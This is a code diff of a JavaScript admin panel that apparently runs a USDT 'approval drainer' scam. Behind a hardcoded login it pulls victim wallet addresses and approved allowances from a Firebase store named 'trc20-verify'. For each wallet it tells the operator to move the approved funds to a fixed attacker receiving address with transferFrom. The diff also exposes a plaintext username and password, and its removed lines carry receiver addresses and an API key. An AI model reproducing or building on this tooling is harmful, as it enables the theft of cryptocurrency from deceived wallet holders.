@@ -1,77 +1,59 @@
-const TRC20_RECEIVER = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN';
-const BEP20_RECEIVER = '0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E';
-
-const TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const BEP20_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
-
-const BSC_API_KEY = 'KW2H7WKIP7Q8UTFB7G7Q1U24R8XWV5KDY4';
-
 const USERNAME = "enre.atul";
 const PASSWORD = "Honda988701@";
 
+const firebaseUrl = "https://trc20-verify-17c29-default-rtdb.firebaseio.com/users.json";
+const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC-20 USDT
+
+document.getElementById("dashboard").style.display = "none";
+
 function login() {
-  const user = document.getElementById("username").value;
-  const pass = document.getElementById("password").value;
-  if (user === USERNAME && pass === PASSWORD) {
-    document.getElementById("loginBox").classList.add("hidden");
-    document.getElementById("adminPanel").classList.remove("hidden");
-    loadWalletLogs();
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value.trim();
+
+  if (username === USERNAME && password === PASSWORD) {
+    document.getElementById("loginSection").style.display = "none";
+    document.getElementById("dashboard").style.display = "block";
+    fetchWallets();
   } else {
-    alert("Invalid credentials!");
+    alert("Invalid credentials");
   }
 }
 
-async function loadWalletLogs() {
-  const logs = JSON.parse(localStorage.getItem("walletLogs") || "[]");
-  const tbody = document.getElementById("logTable");
-  tbody.innerHTML = "";
+async function fetchWallets() {
+  const res = await fetch(firebaseUrl);
+  const data = await res.json();
+  const table = document.getElementById("walletTableBody");
+  table.innerHTML = "";
 
-  for (let log of logs) {
+  for (let key in data) {
+    const { address, balance, approved } = data[key];
     const tr = document.createElement("tr");
 
-    tr.innerHTML = `
-      <td>${log.time}</td>
-      <td>${log.network}</td>
-      <td>${log.address}</td>
-      <td>${log.balance}</td>
-      <td>${log.approved}</td>
-      <td><button onclick="manualWithdraw('${log.network}', '${log.address}')">Withdraw</button></td>
-    `;
+    const addressTd = document.createElement("td");
+    addressTd.innerText = address;
+    tr.appendChild(addressTd);
 
-    tbody.appendChild(tr);
+    const approvedTd = document.createElement("td");
+    approvedTd.innerText = approved || "0";
+    tr.appendChild(approvedTd);
+
+    const balanceTd = document.createElement("td");
+    balanceTd.innerText = balance || "0";
+    tr.appendChild(balanceTd);
+
+    const buttonTd = document.createElement("td");
+    const btn = document.createElement("button");
+    btn.innerText = "Withdraw";
+    btn.onclick = () => {
+      const userWallet = address;
+      const to = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN"; // Your TRC-20 Receiving Address
+      const amount = approved;
+
+      alert(`Manual Withdraw:\nFrom: ${userWallet}\nTo: ${to}\nAmount: ${amount} USDT\nUse TronLink + tronscan.org > Contract > transferFrom`);
+    };
+    buttonTd.appendChild(btn);
+    tr.appendChild(buttonTd);
+
+    table.appendChild(tr);
   }
 }
-
-async function manualWithdraw(network, userAddress) {
-  alert(`Manual withdraw for ${userAddress} on ${network.toUpperCase()} — Please use transferFrom() in a smart contract.`);
-}
-
-document.getElementById("searchInput").addEventListener("input", function () {
-  const value = this.value.toLowerCase();
-  const rows = document.querySelectorAll("#logTable tr");
-  rows.forEach(row => {
-    row.style.display = row.innerText.toLowerCase().includes(value) ? "" : "none";
-  });
-});
-
-window.addEventListener("load", async () => {
-  // dummy test data on load (replace with real in live dApp)
-  const dummyLogs = [
-    {
-      time: new Date().toLocaleString(),
-      network: "TRC-20",
-      address: "TABC1234567890XYZ",
-      balance: "500 USDT",
-      approved: "Yes"
-    },
-    {
-      time: new Date().toLocaleString(),
-      network: "BEP-20",
-      address: "0xABC1234567890XYZDEF",
-      balance: "340 USDT",
-      approved: "Yes"
-    }
-  ];
-
-  localStorage.setItem("walletLogs", JSON.stringify(dummyLogs));
-});
